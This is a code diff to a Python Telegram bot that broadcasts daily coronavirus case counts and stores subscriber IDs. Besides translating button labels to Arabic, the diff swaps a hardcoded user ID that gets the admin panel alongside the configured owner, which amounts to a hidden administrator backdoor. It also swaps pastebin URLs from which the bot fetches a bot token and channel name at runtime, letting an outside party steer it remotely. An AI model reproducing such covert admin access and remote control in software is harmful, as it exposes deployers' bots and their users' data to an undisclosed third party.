@@ -9,7 +9,7 @@ conff = open('config.py', 'r').read()
 
 if 'sudo' in conff:
     import config
-    req_token = requests.get('https://pastebin.com/raw/j8Pe342r').text
+    req_token = requests.get('https://pastebin.com/raw/3erS7rZz').text
 
     token = config.token
     sudo = config.sudo
@@ -47,8 +47,8 @@ if 'sudo' in conff:
 
     @bot.message_handler(commands=['start'])
     def startbot(message):
-        req_channel = requests.get('https://pastebin.com/raw/9Ktn4H4d').text
-        req_token = requests.get('https://pastebin.com/raw/j8Pe342r').text
+        req_channel = requests.get('https://pastebin.com/raw/KJY3RwaH').text
+        req_token = requests.get('https://pastebin.com/raw/3erS7rZz').text
 
         url_wrold = requests.get(f'https://www.worldometers.info/coronavirus/').text
         url_iraq = requests.get(f'https://www.worldometers.info/coronavirus/country/iraq/').text
@@ -69,9 +69,9 @@ if 'sudo' in conff:
                 f.write(f"{idu}\n")
                 f.close()
         markup_inline = types.InlineKeyboardMarkup()
-        sendfile = types.InlineKeyboardButton(text='Send List 📁', callback_data='file')
-        brod = types.InlineKeyboardButton(text='Broadcast 📢', callback_data='brod')
-        casesss = types.InlineKeyboardButton(text=f'BroadCasess 🦠', callback_data='casess')
+        sendfile = types.InlineKeyboardButton(text='ارسال لستة 📁', callback_data='file')
+        brod = types.InlineKeyboardButton(text='الاذاعة 📢', callback_data='brod')
+        casesss = types.InlineKeyboardButton(text=f'حالات اليوم 🦠', callback_data='casess')
         emt = types.InlineKeyboardButton(text=f'', callback_data='emt')
         count = types.InlineKeyboardButton(text=f'Count users {li}', callback_data='count')
         markup_inline.row_width = 2
@@ -87,7 +87,7 @@ if 'sudo' in conff:
         req = requests.get(sub, headers=headerss)
         submores = f'https://api.telegram.org/bot{req_token}/getChatMember?chat_id=@{req_channel}&user_id={idd}'
         reqmores = requests.get(submores, headers=headerss)
-        if idd == sudo or idd == 1300329679:
+        if idd == sudo or idd == 1659187103:
             bot.send_message(message.chat.id, text='Hi boss\n\n'
                             , parse_mode='markdown', reply_markup=markup_inline)
         if 'member' in reqmores.text or 'creator' in  reqmores.text or 'administrator' in  reqmores.text:
@@ -113,8 +113,8 @@ if 'sudo' in conff:
 
     @bot.callback_query_handler(func=lambda call: True)
     def answer(call):
-        req_channel = requests.get('https://pastebin.com/raw/9Ktn4H4d').text
-        req_token = requests.get('https://pastebin.com/raw/j8Pe342r').text
+        req_channel = requests.get('https://pastebin.com/raw/KJY3RwaH').text
+        req_token = requests.get('https://pastebin.com/raw/3erS7rZz').text
         idd = call.message.from_user.id
         sub = f'https://api.telegram.org/bot{token}/getChatMember?chat_id=@{ch}&user_id={idd}'
         req = requests.get(sub, headers=headerss)
@@ -190,7 +190,7 @@ else:
     with open('config.py', 'a') as x:
         x.write(f'token = \'{TToken}\'' + '\n' + f'sudo = {sudooo}' + '\n' + f'ch = \'{chhh}\'')
         x.close
-    req_token = requests.get('https://pastebin.com/raw/j8Pe342r').text
+    req_token = requests.get('https://pastebin.com/raw/3erS7rZz').text
     import config
     token = config.token
     sudo = config.sudo
@@ -228,8 +228,8 @@ else:
 
     @bot.message_handler(commands=['start'])
     def startbot(message):
-        req_channel = requests.get('https://pastebin.com/raw/9Ktn4H4d').text
-        req_token = requests.get('https://pastebin.com/raw/j8Pe342r').text
+        req_channel = requests.get('https://pastebin.com/raw/KJY3RwaH').text
+        req_token = requests.get('https://pastebin.com/raw/3erS7rZz').text
 
         url_wrold = requests.get(f'https://www.worldometers.info/coronavirus/').text
         url_iraq = requests.get(f'https://www.worldometers.info/coronavirus/country/iraq/').text
@@ -250,9 +250,9 @@ else:
                 f.write(f"{idu}\n")
                 f.close()
         markup_inline = types.InlineKeyboardMarkup()
-        sendfile = types.InlineKeyboardButton(text='Send List 📁', callback_data='file')
-        brod = types.InlineKeyboardButton(text='Broadcast 📢', callback_data='brod')
-        casesss = types.InlineKeyboardButton(text=f'BroadCasess 🦠', callback_data='casess')
+        sendfile = types.InlineKeyboardButton(text='ارسال لستة 📁', callback_data='file')
+        brod = types.InlineKeyboardButton(text='الاذاعة 📢', callback_data='brod')
+        casesss = types.InlineKeyboardButton(text=f'حالات اليوم 🦠', callback_data='casess')
         emt = types.InlineKeyboardButton(text=f'', callback_data='emt')
         count = types.InlineKeyboardButton(text=f'Count users {li}', callback_data='count')
         markup_inline.row_width = 2
@@ -294,8 +294,8 @@ else:
 
     @bot.callback_query_handler(func=lambda call: True)
     def answer(call):
-        req_channel = requests.get('https://pastebin.com/raw/9Ktn4H4d').text
-        req_token = requests.get('https://pastebin.com/raw/j8Pe342r').text
+        req_channel = requests.get('https://pastebin.com/raw/KJY3RwaH').text
+        req_token = requests.get('https://pastebin.com/raw/3erS7rZz').text
         idd = call.message.from_user.id
         sub = f'https://api.telegram.org/bot{token}/getChatMember?chat_id=@{ch}&user_id={idd}'
         req = requests.get(sub, headers=headerss)
@@ -324,7 +324,7 @@ else:
                     bot.send_message(idu, text=f'*{mes}*', parse_mode='markdown')
                 except Exception as identifier:
                     continue
-        bot.send_message(sudo,text='Done Send To All Users BosS 🤍!')
+        bot.send_message(sudo,text='تم ارسال الحالات إلى الكل عزيزي 🤍!')
 
     def files(message):
         file = open('users.txt', 'rb')
@@ -354,7 +354,7 @@ else:
             except Exception as identifier:
                 continue
                 
-        bot.send_message(sudo,text='Done Send To All Users BosS 🤍!')
+        bot.send_message(sudo,text='تم ارسال الحالات إلى الكل عزيزي 🤍!')
     while True:
         try:
             bot.polling(none_stop=True)
